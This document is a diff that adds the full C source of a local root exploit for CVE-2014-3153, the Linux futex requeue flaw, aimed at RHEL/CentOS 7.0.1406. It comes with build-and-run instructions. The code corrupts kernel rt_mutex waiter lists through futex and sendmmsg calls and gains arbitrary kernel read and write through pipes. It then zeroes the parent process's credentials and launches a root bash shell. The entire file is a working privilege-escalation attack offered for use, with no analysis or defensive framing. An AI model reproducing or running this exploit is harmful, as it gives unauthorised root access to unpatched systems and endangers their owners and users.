@@ -1,0 +1,701 @@
+/*
+ * CVE-2014-3153 exploit for RHEL/CentOS 7.0.1406
+ * By Kaiqu Chen ( kaiquchen@163.com )
+ * Based on libfutex and the expoilt for Android by GeoHot.
+ *
+ * Usage:
+ * $gcc exploit.c -o exploit -lpthread
+ * $./exploit
+ *
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdbool.h>
+#include <pthread.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <string.h>
+#include <errno.h>
+#include <linux/futex.h>
+#include <sys/socket.h>
+#include <sys/mman.h>
+#include <sys/syscall.h>
+#include <sys/resource.h>
+#include <arpa/inet.h>
+#include <netinet/in.h>  
+#include <netinet/tcp.h>  
+
+#define ARRAY_SIZE(a)	(sizeof (a) / sizeof (*(a)))
+
+#define FUTEX_WAIT_REQUEUE_PI   11
+#define FUTEX_CMP_REQUEUE_PI    12
+#define USER_PRIO_BASE          120
+#define LOCAL_PORT              5551
+
+#define SIGNAL_HACK_KERNEL      12
+#define SIGNAL_THREAD_EXIT      10
+
+#define OFFSET_PID			0x4A4 
+#define OFFSET_REAL_PARENT	0x4B8
+#define OFFSET_CRED			0x668
+
+#define SIZEOF_CRED			160
+#define SIZEOF_TASK_STRUCT	2912
+#define OFFSET_ADDR_LIMIT	0x20
+
+#define PRIO_LIST_OFFSET	8	
+#define NODE_LIST_OFFSET	(PRIO_LIST_OFFSET + sizeof(struct list_head))
+#define PRIO_LIST_TO_WAITER(list) (((void *)(list)) - PRIO_LIST_OFFSET)
+#define WAITER_TO_PRIO_LIST(waiter) (((void *)(waiter)) + PRIO_LIST_OFFSET)
+#define NODE_LIST_TO_WAITER(list) (((void *)(list)) - NODE_LIST_OFFSET)
+#define WAITER_TO_NODE_LIST(waiter) (((void *)(waiter)) + NODE_LIST_OFFSET)
+#define MUTEX_TO_PRIO_LIST(mutex) (((void *)(mutex)) + sizeof(long))
+#define MUTEX_TO_NODE_LIST(mutex) (((void *)(mutex)) + sizeof(long) + sizeof(struct list_head))
+
+////////////////////////////////////////////////////////////////////
+struct task_struct;
+
+struct thread_info {
+  struct task_struct *task;
+  void *exec_domain;
+  int flags;
+  int status;
+  int cpu;
+  int preempt_count;
+  void *addr_limit;
+};
+
+struct list_head {
+  struct list_head *next;
+  struct list_head *prev;
+};
+
+struct plist_head {
+	struct list_head node_list;
+};
+
+struct plist_node {
+  int                     prio;
+  struct list_head        prio_list;
+  struct list_head        node_list;
+};
+
+struct rt_mutex {
+	unsigned long		wait_lock;
+	struct plist_head	wait_list;
+	struct task_struct	*owner;
+};
+
+struct rt_mutex_waiter {
+  struct plist_node       list_entry;
+  struct plist_node       pi_list_entry;
+  struct task_struct      *task;
+  struct rt_mutex         *lock;
+};
+
+struct mmsghdr {
+  struct msghdr msg_hdr;
+  unsigned int  msg_len;
+};
+
+struct cred {
+	int	usage;
+	int	uid;		/* real UID of the task */
+	int	gid;		/* real GID of the task */
+	int	suid;		/* saved UID of the task */
+	int	sgid;		/* saved GID of the task */
+	int	euid;		/* effective UID of the task */
+	int	egid;		/* effective GID of the task */
+	int	fsuid;		/* UID for VFS ops */
+	int	fsgid;		/* GID for VFS ops */
+};
+
+////////////////////////////////////////////////////////////////////
+
+static int swag = 0;
+static int swag2 = 0;
+static int main_pid;
+
+static pid_t waiter_thread_tid;
+
+static pthread_mutex_t hacked_lock;
+static pthread_cond_t hacked;
+
+static pthread_mutex_t done_lock;
+static pthread_cond_t done;
+
+static pthread_mutex_t is_thread_desched_lock;
+static pthread_cond_t is_thread_desched;
+
+static volatile int do_socket_tid_read = 0;
+static volatile int did_socket_tid_read = 0;
+
+static volatile int do_dm_tid_read = 0;
+static volatile int did_dm_tid_read = 0;
+
+static pid_t last_tid = 0;
+
+static volatile int_sync_time_out = 0;
+
+struct thread_info thinfo;
+char task_struct_buf[SIZEOF_TASK_STRUCT];
+struct cred cred_buf;
+
+struct thread_info *hack_thread_stack = NULL;
+
+pthread_t thread_client_to_setup_rt_waiter;
+
+int listenfd;
+int sockfd;
+int clientfd;
+
+////////////////////////////////////////////////////////////////
+int gettid()
+{
+	return syscall(__NR_gettid);
+}
+
+ssize_t read_pipe(void *kbuf, void *ubuf, size_t count) {
+	int pipefd[2];
+	ssize_t len;
+
+	pipe(pipefd);
+
+	len = write(pipefd[1], kbuf, count);
+
+	if (len != count) {
+		printf("Thread %d failed in reading @ %p : %d %d\n", gettid(), kbuf, (int)len, errno);
+		while(1) { sleep(10); }
+	}
+
+	read(pipefd[0], ubuf, count);
+
+	close(pipefd[0]);
+	close(pipefd[1]);
+
+	return len;
+}
+
+ssize_t write_pipe(void *kbuf, void *ubuf, size_t count) {
+	int pipefd[2];
+	ssize_t len;
+
+	pipe(pipefd);
+
+	write(pipefd[1], ubuf, count);
+	len = read(pipefd[0], kbuf, count);
+
+	if (len != count) {
+		printf("Thread %d failed in writing @ %p : %d %d\n", gettid(), kbuf, (int)len, errno);
+		while(1) { sleep(10); }
+	}
+
+	close(pipefd[0]);
+	close(pipefd[1]);
+
+	return len;
+}
+
+int pthread_cancel_immediately(pthread_t thid)
+{
+	pthread_kill(thid, SIGNAL_THREAD_EXIT);
+	pthread_join(thid, NULL);
+	return 0;
+}
+
+void set_addr_limit(void *sp)
+{
+	long newlimit = -1;
+	write_pipe(sp + OFFSET_ADDR_LIMIT, (void *)&newlimit, sizeof(long));
+}
+
+void set_cred(struct cred *kcred)
+{
+	struct cred cred_buf;
+	int len;
+
+	len = read_pipe(kcred, &cred_buf, sizeof(cred_buf));
+	cred_buf.uid = cred_buf.euid = cred_buf.suid = cred_buf.fsuid = 0;
+	cred_buf.gid = cred_buf.egid = cred_buf.sgid = cred_buf.fsgid = 0;
+	len = write_pipe(kcred, &cred_buf, sizeof(cred_buf));
+}
+
+struct rt_mutex_waiter *pwaiter11;
+
+void set_parent_cred(void *sp, int parent_tid)
+{
+	int len;
+	int tid;
+	struct task_struct *pparent;
+	struct cred *pcred;
+	
+	set_addr_limit(sp);
+	
+	len = read_pipe(sp, &thinfo, sizeof(thinfo));
+	if(len != sizeof(thinfo)) {
+		printf("Read %p error %d\n", sp, len);
+	}
+	
+	void *ptask = thinfo.task;
+	len = read_pipe(ptask, task_struct_buf, SIZEOF_TASK_STRUCT);
+	tid = *(int *)(task_struct_buf + OFFSET_PID);
+
+	while(tid != 0 && tid != parent_tid) {
+		pparent = *(struct task_struct **)(task_struct_buf + OFFSET_REAL_PARENT);
+		len = read_pipe(pparent, task_struct_buf, SIZEOF_TASK_STRUCT);
+		tid = *(int *)(task_struct_buf + OFFSET_PID);
+	}
+
+	if(tid == parent_tid) {
+		pcred = *(struct cred **)(task_struct_buf + OFFSET_CRED);
+		set_cred(pcred);
+	} else
+		printf("Pid %d not found\n", parent_tid);
+	return;
+}
+
+static int read_voluntary_ctxt_switches(pid_t pid)
+{
+	char filename[256];
+	FILE *fp;
+	int vcscnt = -1;
+
+	sprintf(filename, "/proc/self/task/%d/status", pid);
+	fp = fopen(filename, "rb");
+	if (fp) {
+		char filebuf[4096];
+		char *pdest;
+		fread(filebuf, 1, sizeof filebuf, fp);
+		pdest = strstr(filebuf, "voluntary_ctxt_switches");
+		vcscnt = atoi(pdest + 0x19);
+		fclose(fp);
+	}
+	return vcscnt;
+}
+
+static void sync_timeout_task(int sig)
+{
+	int_sync_time_out = 1;
+}
+
+static int sync_with_child_getchar(pid_t pid, int volatile *do_request, int volatile *did_request)
+{
+	while (*do_request == 0) { }
+	printf("Press RETURN after one second...");
+	*did_request = 1;
+	getchar();
+	return 0;
+}
+
+static int sync_with_child(pid_t pid, int volatile *do_request, int volatile *did_request)
+{
+	struct sigaction act;
+	int vcscnt;
+	int_sync_time_out = 0;
+
+	act.sa_handler = sync_timeout_task;
+	sigemptyset(&act.sa_mask);
+	act.sa_flags = 0;
+	act.sa_restorer = NULL;
+	sigaction(SIGALRM, &act, NULL);
+
+	alarm(3);
+	while (*do_request == 0) {
+		if (int_sync_time_out)
+			return -1;
+	}
+	
+	alarm(0);
+	vcscnt = read_voluntary_ctxt_switches(pid);
+	*did_request = 1;
+	while (read_voluntary_ctxt_switches(pid) != vcscnt + 1) {
+    	usleep(10);
+	}
+
+	return 0;
+}
+
+static void sync_with_parent(int volatile *do_request, int volatile *did_request)
+{
+	*do_request = 1;
+	while (*did_request == 0) { }
+}
+
+void fix_rt_mutex_waiter_list(struct rt_mutex *pmutex)
+{
+	struct rt_mutex_waiter *pwaiter6, *pwaiter7;
+	struct rt_mutex_waiter waiter6, waiter7;
+	struct rt_mutex mutex;
+	if(!pmutex) 
+		return;
+	read_pipe(pmutex, &mutex, sizeof(mutex));
+	pwaiter6 = NODE_LIST_TO_WAITER(mutex.wait_list.node_list.next);
+	if(!pwaiter6) 
+		return;
+	read_pipe(pwaiter6, &waiter6, sizeof(waiter6));
+	pwaiter7 = NODE_LIST_TO_WAITER(waiter6.list_entry.node_list.next);
+	if(!pwaiter7) 
+		return;
+	read_pipe(pwaiter7, &waiter7, sizeof(waiter7));
+	
+	waiter6.list_entry.prio_list.prev = waiter6.list_entry.prio_list.next;
+	waiter7.list_entry.prio_list.next = waiter7.list_entry.prio_list.prev;
+	mutex.wait_list.node_list.prev = waiter6.list_entry.node_list.next;
+	waiter7.list_entry.node_list.next =  waiter6.list_entry.node_list.prev;
+	
+	write_pipe(pmutex, &mutex, sizeof(mutex));
+	write_pipe(pwaiter6, &waiter6, sizeof(waiter6));
+	write_pipe(pwaiter7, &waiter7, sizeof(waiter7));
+}
+
+static void void_handler(int signum)
+{
+	pthread_exit(0);
+}
+
+static void kernel_hack_task(int signum)
+{
+	struct rt_mutex *prt_mutex, rt_mutex;
+	struct rt_mutex_waiter rt_waiter11;
+	int tid = syscall(__NR_gettid);
+	int pid = getpid();
+
+	set_parent_cred(hack_thread_stack, main_pid);
+	
+	read_pipe(pwaiter11, (void *)&rt_waiter11, sizeof(rt_waiter11));
+	
+	prt_mutex = rt_waiter11.lock;
+	read_pipe(prt_mutex, (void *)&rt_mutex, sizeof(rt_mutex));
+	
+	void *ptask_struct = rt_mutex.owner;
+	ptask_struct = (void *)((long)ptask_struct & ~ 0xF);
+	int len = read_pipe(ptask_struct, task_struct_buf, SIZEOF_TASK_STRUCT);
+	int *ppid = (int *)(task_struct_buf + OFFSET_PID);
+	void **pstack = (void **)&task_struct_buf[8];
+	void *owner_sp = *pstack;
+	set_addr_limit(owner_sp);
+
+	pthread_mutex_lock(&hacked_lock);
+	pthread_cond_signal(&hacked);
+	pthread_mutex_unlock(&hacked_lock);
+}
+
+static void *call_futex_lock_pi_with_priority(void *arg)
+{
+	int prio;
+	struct sigaction act;
+	int ret;
+	
+	prio = (long)arg;
+	last_tid = syscall(__NR_gettid);
+	
+	pthread_mutex_lock(&is_thread_desched_lock);
+	pthread_cond_signal(&is_thread_desched);
+	
+	act.sa_handler = void_handler;
+	sigemptyset(&act.sa_mask);
+	act.sa_flags = 0;
+	act.sa_restorer = NULL;
+	sigaction(SIGNAL_THREAD_EXIT, &act, NULL);
+	
+	act.sa_handler = kernel_hack_task;
+	sigemptyset(&act.sa_mask);
+	act.sa_flags = 0;
+	act.sa_restorer = NULL;
+	sigaction(SIGNAL_HACK_KERNEL, &act, NULL);
+	
+	setpriority(PRIO_PROCESS, 0, prio);
+	
+	pthread_mutex_unlock(&is_thread_desched_lock);
+	
+	sync_with_parent(&do_dm_tid_read, &did_dm_tid_read);
+	
+	ret = syscall(__NR_futex, &swag2, FUTEX_LOCK_PI, 1, 0, NULL, 0);
+	
+	return NULL;
+}
+
+static pthread_t create_thread_do_futex_lock_pi_with_priority(int prio)
+{
+	pthread_t th4;
+	pid_t pid;
+	
+	do_dm_tid_read = 0;
+	did_dm_tid_read = 0;
+	
+	pthread_mutex_lock(&is_thread_desched_lock);
+	pthread_create(&th4, 0, call_futex_lock_pi_with_priority, (void *)(long)prio);
+	pthread_cond_wait(&is_thread_desched, &is_thread_desched_lock);
+	
+	pid = last_tid;
+	
+	sync_with_child(pid, &do_dm_tid_read, &did_dm_tid_read);
+	
+	pthread_mutex_unlock(&is_thread_desched_lock);
+	
+	return th4;
+}
+
+static int server_for_setup_rt_waiter(void)
+{
+	int sockfd;
+	int yes = 1;
+	struct sockaddr_in addr = {0};
+	
+	sockfd = socket(AF_INET, SOCK_STREAM, SOL_TCP);
+	
+	setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, (char *)&yes, sizeof(yes));
+	
+	addr.sin_family = AF_INET;
+	addr.sin_port = htons(LOCAL_PORT);
+	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+	bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
+	
+	listen(sockfd, 1);
+	listenfd = sockfd;
+	
+	return accept(sockfd, NULL, NULL);
+}
+
+static int connect_server_socket(void)
+{
+	int sockfd;
+	struct sockaddr_in addr = {0};
+	int ret;
+	int sock_buf_size;
+	
+	sockfd = socket(AF_INET, SOCK_STREAM, SOL_TCP);
+	if (sockfd < 0) {
+		printf("socket failed\n");
+		usleep(10);
+	} else {
+		addr.sin_family = AF_INET;
+		addr.sin_port = htons(LOCAL_PORT);
+		addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+	}
+	
+	while (connect(sockfd, (struct sockaddr *)&addr, 16) < 0) {
+		usleep(10);
+	}
+	
+	sock_buf_size = 1;
+	setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, (char *)&sock_buf_size, sizeof(sock_buf_size));
+	
+	return sockfd;
+}
+
+unsigned long iov_base0, iov_basex;
+size_t iov_len0, iov_lenx;
+
+static void *client_to_setup_rt_waiter(void *waiter_plist)
+{
+	int sockfd;
+	struct mmsghdr msgvec[1];
+	struct iovec msg_iov[8];
+	unsigned long databuf[0x20];
+	int i;
+	int ret;
+	struct sigaction act;
+	
+	act.sa_handler = void_handler;
+	sigemptyset(&act.sa_mask);
+	act.sa_flags = 0;
+	act.sa_restorer = NULL;
+	sigaction(SIGNAL_THREAD_EXIT, &act, NULL);
+	
+	waiter_thread_tid = syscall(__NR_gettid);
+	setpriority(PRIO_PROCESS, 0, 12);
+	
+	sockfd = connect_server_socket();
+	clientfd = sockfd;
+	
+	for (i = 0; i < ARRAY_SIZE(databuf); i++) {
+	databuf[i] = (unsigned long)waiter_plist;
+	}
+	
+	for (i = 0; i < ARRAY_SIZE(msg_iov); i++) {
+	msg_iov[i].iov_base = waiter_plist;
+	msg_iov[i].iov_len = (long)waiter_plist;
+	}
+	msg_iov[1].iov_base = (void *)iov_base0;
+	
+	msgvec[0].msg_hdr.msg_name = databuf;
+	msgvec[0].msg_hdr.msg_namelen = sizeof databuf;
+	msgvec[0].msg_hdr.msg_iov = msg_iov;
+	msgvec[0].msg_hdr.msg_iovlen = ARRAY_SIZE(msg_iov);
+	msgvec[0].msg_hdr.msg_control = databuf;
+	msgvec[0].msg_hdr.msg_controllen = ARRAY_SIZE(databuf);
+	msgvec[0].msg_hdr.msg_flags = 0;
+	msgvec[0].msg_len = 0;
+	
+	syscall(__NR_futex, &swag, FUTEX_WAIT_REQUEUE_PI, 0, 0, &swag2, 0);
+	
+	sync_with_parent(&do_socket_tid_read, &did_socket_tid_read);
+	
+	ret = 0;
+	
+	while (1) {
+	ret = syscall(__NR_sendmmsg, sockfd, msgvec, 1, 0);
+	if (ret <= 0) {
+		break;
+	} else 
+		printf("sendmmsg ret %d\n", ret);
+	}
+	return NULL;
+}
+
+static void plist_set_next(struct list_head *node, struct list_head *head)
+{
+	node->next = head;
+	head->prev = node;
+	node->prev = head;
+	head->next = node;
+}
+
+static void setup_waiter_params(struct rt_mutex_waiter *rt_waiters)
+{
+	rt_waiters[0].list_entry.prio = USER_PRIO_BASE + 9;
+	rt_waiters[1].list_entry.prio = USER_PRIO_BASE + 13;
+	plist_set_next(&rt_waiters[0].list_entry.prio_list, &rt_waiters[1].list_entry.prio_list);
+	plist_set_next(&rt_waiters[0].list_entry.node_list, &rt_waiters[1].list_entry.node_list);
+}
+
+static bool do_exploit(void *waiter_plist)
+{
+	void *magicval, *magicval2;
+	struct rt_mutex_waiter *rt_waiters;
+	pid_t pid;
+	pid_t pid6, pid7, pid12, pid11;
+	
+	rt_waiters = PRIO_LIST_TO_WAITER(waiter_plist);
+	
+	syscall(__NR_futex, &swag2, FUTEX_LOCK_PI, 1, 0, NULL, 0);
+	
+	while (syscall(__NR_futex, &swag, FUTEX_CMP_REQUEUE_PI, 1, 0, &swag2, swag) != 1) {
+		usleep(10);
+	}
+	
+	pthread_t th6 =  create_thread_do_futex_lock_pi_with_priority(6);
+	pthread_t th7 =  create_thread_do_futex_lock_pi_with_priority(7);
+	
+	swag2 = 0;
+	do_socket_tid_read = 0;
+	did_socket_tid_read = 0;
+	
+	syscall(__NR_futex, &swag2, FUTEX_CMP_REQUEUE_PI, 1, 0, &swag2, swag2);
+	
+	if (sync_with_child_getchar(waiter_thread_tid, &do_socket_tid_read, &did_socket_tid_read) < 0) {
+	return false;
+	}
+	
+	setup_waiter_params(rt_waiters);
+	magicval = rt_waiters[0].list_entry.prio_list.next;
+	printf("Checking whether exploitable..");
+	pthread_t th11 =  create_thread_do_futex_lock_pi_with_priority(11);
+	
+	if (rt_waiters[0].list_entry.prio_list.next == magicval) {
+		printf("failed\n");
+		return false;
+	}
+	printf("OK\nSeaching good magic...\n");
+	magicval = rt_waiters[0].list_entry.prio_list.next;
+	
+	pthread_cancel_immediately(th11);
+	
+	pthread_t th11_1, th11_2;
+	while(1) {
+		setup_waiter_params(rt_waiters);
+		th11_1 = create_thread_do_futex_lock_pi_with_priority(11);
+		magicval = rt_waiters[0].list_entry.prio_list.next;
+		hack_thread_stack = (struct thread_info *)((unsigned long)magicval & 0xffffffffffffe000);
+		rt_waiters[1].list_entry.node_list.prev = (void *)&hack_thread_stack->addr_limit;
+		
+		th11_2 = create_thread_do_futex_lock_pi_with_priority(11);
+		magicval2 = rt_waiters[1].list_entry.node_list.prev;
+		
+		printf("magic1=%p magic2=%p\n", magicval, magicval2);
+		if(magicval < magicval2) {
+			printf("Good magic found\nHacking...\n");
+			break;
+		} else {
+			pthread_cancel_immediately(th11_1);
+			pthread_cancel_immediately(th11_2);
+		}		
+	}
+	pwaiter11 = NODE_LIST_TO_WAITER(magicval2);
+	pthread_mutex_lock(&hacked_lock);
+	pthread_kill(th11_1, SIGNAL_HACK_KERNEL);
+	pthread_cond_wait(&hacked, &hacked_lock);
+	pthread_mutex_unlock(&hacked_lock);
+	close(listenfd);
+	
+	struct rt_mutex_waiter waiter11;
+	struct rt_mutex *pmutex;
+	int len = read_pipe(pwaiter11, &waiter11, sizeof(waiter11));
+	if(len != sizeof(waiter11)) {
+		pmutex = NULL;
+	} else {
+		pmutex = waiter11.lock;
+	}
+	fix_rt_mutex_waiter_list(pmutex);
+	
+	pthread_cancel_immediately(th11_1);
+	pthread_cancel_immediately(th11_2);
+	
+	pthread_cancel_immediately(th7);
+	pthread_cancel_immediately(th6);
+	close(clientfd);
+	pthread_cancel_immediately(thread_client_to_setup_rt_waiter);
+	
+	exit(0);
+}
+
+#define MMAP_ADDR_BASE	0x0c000000
+#define MMAP_LEN		0x0c001000
+
+int main(int argc, char *argv[])
+{
+	unsigned long mapped_address;
+	void *waiter_plist;
+	
+	printf("CVE-2014-3153 exploit by Chen Kaiqu(kaiquchen@163.com)\n");
+  
+	main_pid = gettid();
+	if(fork() == 0) {
+		iov_base0 = (unsigned long)mmap((void *)0xb0000000, 0x10000, PROT_READ | PROT_WRITE | PROT_EXEC, /*MAP_POPULATE |*/ MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
+		if (iov_base0 < 0xb0000000) {
+			printf("mmap failed?\n");
+			return 1;
+		}
+		iov_len0 = 0x10000;
+		
+		iov_basex = (unsigned long)mmap((void *)MMAP_ADDR_BASE, MMAP_LEN, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
+		if (iov_basex < MMAP_ADDR_BASE) {
+			printf("mmap failed?\n");
+			return 1;
+		}
+		iov_lenx = MMAP_LEN;
+		
+		waiter_plist = (void *)iov_basex + 0x400;
+		pthread_create(&thread_client_to_setup_rt_waiter, NULL, client_to_setup_rt_waiter, waiter_plist);
+		
+		sockfd = server_for_setup_rt_waiter();
+		if (sockfd < 0) {
+			printf("Server failed\n");
+			return 1;
+		}
+		
+		if (!do_exploit(waiter_plist)) {
+			return 1;
+		}
+		return 0;
+	}
+
+	while(getuid())
+		usleep(100);
+	execl("/bin/bash", "bin/bash", NULL);
+	return 0;
+}
+
